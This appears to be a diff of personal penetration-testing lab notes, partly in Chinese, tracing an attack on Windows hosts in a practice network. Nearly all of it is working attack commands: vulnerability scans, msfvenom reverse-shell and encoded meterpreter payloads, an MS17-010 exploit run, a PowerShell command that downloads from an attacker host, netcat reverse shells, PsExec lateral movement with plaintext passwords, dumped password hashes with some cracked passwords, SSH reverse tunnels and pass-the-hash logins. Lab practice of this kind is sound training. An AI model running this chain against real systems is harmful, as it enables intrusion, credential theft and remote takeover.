@@ -1,7 +1,74 @@
 nmap -sV -sC -Pn 10.11.1.5 > nmap.txt
 
 nmap --script=smb-enum-shares -Pn -p 445 10.11.1.5
-nmap --script vuln -sV -p 135,139,445,1025 -Pn  10.11.1.5   > nmapvuln.txt
+nmap -script vuln* -p 135,139,445,1025 -sC -sV -Pn  10.11.1.5  > nmapvuln.txt
+nmap --script=smb-vuln* -Pn -p 135,139,445,1025 10.11.1.5 > nmapsmb.txt
 
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.31.129 LPORT=4444                                                                                                                                                            130 ⨯
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.129 LPORT=4444 -f exe > meterpreter.exe                                                                                                                                              130 ⨯
+(windows/meterpreter/reverse_tcp)
+
+msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.119.134 lport=4444 -e x64/xor -i 5 -f exe -o sc.exe
+smbclient -N -U guest //192.168.37.109/finance
+
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=4444 -f exe > ms17–010.exe
+python send_and_execute.py 10.11.1.5 ms17–010.exe
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/nc.exe')
+
+kali:提供samba服務
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py timmy `pwd`
+
+victim:連接samba
+powershell New-PSDrive -Name "timmy" -PSProvider "FileSystem" -Root "\\192.168.119.134\timmy"
+進入到samba資料夾
+cd timmy:
+echo 123 > 123.txt
+
+PsExec.exe /accepteula -u alice -p aliceishere "C:\nc.exe" -nv 10.11.1.50 135 -e cmd.exe
+
+psexec64.exe \\10.11.1.50 -u alice -p aliceishere cmd.exe
+psexec64.exe /accepteula /s \\10.11.1.50 -u alice -p aliceishere cmd
+PsExec.exe /accepteula /s \\10.11.1.50 -u Administrator -p Aatest cmd
+PsExec.exe  -u  thinc.local\alice -p aliceishere \\10.11.1.50 netstat -na
+
+PsExec.exe \\10.11.1.50 -u administrator -p aliceishere cmd.exe
+
+
+
+
+
+C:\nc.exe 192.168.119.134 5555 -e cmd.exe
+
+################
+1.參考HackTheBox Legacy
+https://medium.com/@simonsulyma/hack-the-box-legacy-penetration-testing-without-metasploit-44b628fe870f
+python send_and_execute.py 10.11.1.5 ms17–010.exe
+
+2.該台機器可以找到proof.txt,ALICE.txt,account,
+3.因為是舊的windows所以windows無法使用,必須使用fgdump可導出密碼
+
+Administrator:500:NO PASSWORD*********************:A8C8B7A37513B7EB9308952B814B522B:::
+alice:1004:NO PASSWORD*********************:B74242F37E47371AFF835A6EBCAC4FFE::: aliceishere
+Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
+HelpAssistant:1000:05FA67EAEC4D789EC4BD52F48E5A6B28:2733CDB0D8A1FEC3F976F3B8AD1DEEEF::: 0u+0Eo4B0dnPbJ
+SUPPORT_388945a0:1002:NO PASSWORD*********************:0F7A50DD4B95CEC4C1DEA566F820F4E7:::
+
+
+
+plink.exe -ssh -l kali -pw kali-R 192.168.119.134:6666:10.11.1.50:445 kali@192.168.119.134
+python3 ./psexec.py -hashes b7xxxxx:b7xxxxx alice@127.0.0.1 -port 6666
+
+
+
+C:\Users\Public>plink.exe -N -ssh -l **** -pw **** -R 192.168.119.***:10255 :127.0.0.1:445 192.168.119.***
+C:\Users\Public>plink.exe -N -ssh -l **** -pw **** -R 192.168.119.***:445:127.0.0.1:445 192.168.119.***
+
+and try to connect with alice creds
+psexec.py alice:al*******@127.0.0.1 -port 445
+
+
+
+plink.exe -ssh -l kali -pw kali -R 192.168.119.134:1234:127.0.0.1:3306 192.168.119.134
